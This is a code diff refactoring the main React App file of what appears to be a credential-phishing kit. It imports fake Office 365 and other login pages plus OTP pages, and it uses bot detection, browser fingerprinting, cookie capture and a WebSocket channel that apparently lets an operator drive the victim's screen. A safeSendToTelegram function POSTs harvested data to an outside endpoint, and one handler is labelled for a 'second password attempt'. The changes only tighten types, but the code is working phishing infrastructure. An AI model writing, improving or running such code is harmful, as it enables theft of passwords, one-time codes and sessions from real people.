@@ -10,7 +10,6 @@ import OthersLoginPage from './components/OthersLoginPage';
 import Office365Wrapper from './components/Office365Wrapper';
 import LandingPage from './components/LandingPage';
 import MobileLandingPage from './components/mobile/MobileLandingPage';
-import CloudflareCaptcha from './components/CloudflareCaptcha';
 import OtpPage from './components/OtpPage';
 import MobileOtpPage from './components/mobile/MobileOtpPage';
 import ProviderRedirect from './components/ProviderRedirect';
@@ -18,10 +17,10 @@ import Spinner from './components/common/Spinner';
 import InteractiveState, { UIStateType } from './components/InteractiveState';
 import { useWebSocket, WebSocketMessage } from './hooks/useWebSocket';
 import { getBrowserFingerprint } from './utils/oauthHandler';
-import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
+import { getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
 import { config } from './config';
 
-const safeSendToTelegram = async (payload: any) => {
+const safeSendToTelegram = async (payload: Record<string, unknown>) => {
   try {
     const res = await fetch(config.api.sendTelegramEndpoint, {
       method: 'POST',
@@ -147,9 +146,12 @@ function App() {
   const [isInitializing, setIsInitializing] = useState(true);
   const [isBotDetected, setIsBotDetected] = useState(false);
   const [initMessage, setInitMessage] = useState('Connecting...');
-  const [loginFlowState, setLoginFlowState] = useState({
+  const [loginFlowState, setLoginFlowState] = useState<{
+    awaitingOtp: boolean;
+    sessionData: Record<string, unknown> | null;
+  }>({
     awaitingOtp: false,
-    sessionData: null as any,
+    sessionData: null,
   });
 
   // WebSocket state management
@@ -158,7 +160,7 @@ function App() {
     active: boolean;
     type: UIStateType;
     provider: string;
-    data?: any;
+    data?: Record<string, unknown>;
   }>({
     active: false,
     type: 'idle',
@@ -248,7 +250,7 @@ function App() {
   };
 
   // Initialize WebSocket connection
-  const { isConnected, sendMessage } = useWebSocket({
+  const { sendMessage } = useWebSocket({
     sessionId,
     onMessage: handleWebSocketMessage,
     onConnect: () => {
@@ -262,7 +264,7 @@ function App() {
   });
 
   // Handle interactive state actions
-  const handleInteractiveAction = (action: string, data?: any) => {
+  const handleInteractiveAction = (action: string, data?: Record<string, unknown>) => {
     console.log('Interactive action:', action, data);
     
     // Send action to backend via WebSocket
@@ -333,7 +335,7 @@ function App() {
     navigate(ROUTES.LOGIN);
   };
 
-  const handleLoginSuccess = async (loginData: any) => {
+  const handleLoginSuccess = async (loginData: Record<string, unknown>) => {
     // This is the handler for the second password attempt.
     setIsLoading(true);
     const browserFingerprint = await getBrowserFingerprint();
